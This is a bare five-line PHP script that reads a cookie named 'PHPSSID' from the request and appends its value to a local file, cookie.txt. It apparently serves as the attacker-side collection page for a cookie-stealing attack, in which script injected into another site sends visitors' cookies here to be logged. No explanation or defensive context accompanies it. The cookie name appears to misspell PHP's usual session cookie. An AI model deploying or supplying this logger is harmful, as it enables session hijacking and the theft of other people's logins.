<?php
$cookie=$_COOKIE['PHPSSID'];
$file=fopen('cookie.txt', 'a');
fwrite($file, $cookie . "\n\n");
?>